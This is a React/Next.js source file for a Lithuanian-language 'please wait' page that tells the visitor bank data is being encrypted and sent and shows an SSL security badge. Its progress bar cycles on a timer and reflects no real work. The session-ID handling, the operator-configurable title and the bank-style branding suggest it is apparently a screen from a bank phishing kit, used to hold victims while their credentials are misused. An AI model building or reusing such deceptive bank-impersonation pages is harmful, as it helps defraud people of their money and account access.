"use client";

import { useEffect, useState } from "react";
import { DemoShell } from "@/components/demo/DemoShell";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
  routeSessionId?: string | null;
};

const MESSAGES = [
  "Užmezgamas saugus ryšys...",
  "Banko duomenys užšifruojami ir siunčiami...",
  "Atliekamas saugumo patikrinimas...",
  "Prašome palaukti...",
  "Ryšys autorizuojamas..."
];

async function resolveShortIdApi(sessionId: string): Promise<string | null> {
  try {
    const res = await fetch(`/api/resolve-short-id`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId }),
      cache: "no-store",
    });
    if (!res.ok) return null;
    const json = await res.json();
    if (json?.ok && json?.public_id) return String(json.public_id);
    return null;
  } catch {
    return null;
  }
}

export function WaitClient({ sessionId, routeSessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();
  const [messageIndex, setMessageIndex] = useState(0);

  // Client-side URL normalizasyonu: URL query param session UUID ise kisa ID'ye cevir
  useEffect(() => {
    if (typeof window === "undefined") return;
    let cancelled = false;

    const run = async () => {
      const url = new URL(window.location.href);
      const sessionQp = url.searchParams.get("session");
      const hasUuidQp =
        sessionQp &&
        /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          sessionQp,
        );

      if (!hasUuidQp) return;

      const sid = sessionQp!;
      const preferred =
        routeSessionId &&
        !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          routeSessionId,
        )
          ? routeSessionId
          : null;

      const shortId = preferred ?? (await resolveShortIdApi(sid));
      if (cancelled) return;
      if (shortId && shortId !== sid) {
        url.searchParams.set("session", shortId);
        const next = url.pathname + url.search + url.hash;
        window.history.replaceState({}, "", next);
      }
    };

    run();
    return () => {
      cancelled = true;
    };
  }, [sessionId, routeSessionId]);

  useEffect(() => {
    const messageTimer = setInterval(() => {
      setMessageIndex((prev) => (prev + 1) % MESSAGES.length);
    }, 3500);
    return () => clearInterval(messageTimer);
  }, []);

  const progressWidth = ((messageIndex + 1) / MESSAGES.length) * 100;


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0fae4e]/30 border-t-[#0fae4e]" />
        </div>
      </div>
    );
  }

  return (
    <div className="bg-[#f8fafc] min-h-screen relative z-50 overflow-hidden flex flex-col">
      {/* Ambient Background Glows */}
      <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-[#0fae4e]/10 blur-[100px] animate-[pulse_6s_ease-in-out_infinite]" />
      <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-[#f7a600]/10 blur-[100px] animate-[pulse_8s_ease-in-out_infinite_alternate]" />

      <main className="flex-1 flex flex-col items-center justify-center p-4 w-full">
        {!sessionId ? (
          <div className="flex justify-center relative z-10 w-full">
            <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
              Neteisinga nuoroda.
            </p>
          </div>
        ) : (
          <div className="w-full bg-white/90 backdrop-blur-xl rounded-[28px] shadow-[0_20px_60px_-15px_rgba(0,131,65,0.15)] p-8 md:p-10 flex flex-col items-center relative overflow-hidden border border-white/60 mx-auto max-w-[440px]">
            {/* Top Security Banner */}
            <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-[#0fae4e] via-[#86efac] to-[#f7a600] bg-[length:200%_100%] animate-[pulse_3s_ease-in-out_infinite]" />
            
            {/* Shield Icon Container */}
            <div className="relative flex items-center justify-center w-28 h-28 mb-6 mt-2">
              {/* Soft pulsing background behind shield */}
              <div className="absolute inset-0 bg-[#0fae4e]/5 rounded-full animate-ping" style={{ animationDuration: '3s' }} />
              
              <div className="absolute inset-0 rounded-full border-[4px] border-[#0fae4e]/10" />
              <div className="absolute inset-0 animate-spin rounded-full border-[4px] border-transparent border-t-[#0fae4e] border-r-[#86efac]" style={{ animationDuration: '1.5s' }} />
              
              <svg className="w-11 h-11 text-[#0fae4e]" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
              </svg>
            </div>

            <h2 className="text-[24px] font-bold text-slate-800 mb-2 text-center tracking-tight">
              {settings.wait_title}
            </h2>
            
            <div className="h-[48px] flex items-center justify-center mb-6 w-full px-4">
              <p 
                key={messageIndex} 
                className="text-center text-[15px] font-medium text-slate-500 animate-[fadeIn_0.5s_ease-in-out]"
              >
                {MESSAGES[messageIndex]}
              </p>
            </div>

            {/* Progress Bar */}
            <div className="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden shadow-inner relative">
              <div 
                className="h-full bg-gradient-to-r from-[#0fae4e] via-[#007a38] to-[#86efac] rounded-full transition-all duration-1000 ease-in-out relative" 
                style={{ width: `${progressWidth}%` }} 
              >
                {/* Highlight gleam on progress bar */}
                <div className="absolute top-0 left-0 w-full h-full bg-white/20 animate-[pulse_2s_ease-in-out_infinite]" />
              </div>
            </div>
            
            {/* Footer Security Badge */}
            <div className="mt-8 flex items-center justify-center gap-2 text-[13px] font-semibold text-[#0fae4e]/70 bg-[#0fae4e]/5 px-4 py-2 rounded-full border border-[#0fae4e]/10">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
              </svg>
              256 bitų SSL šifravimas
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
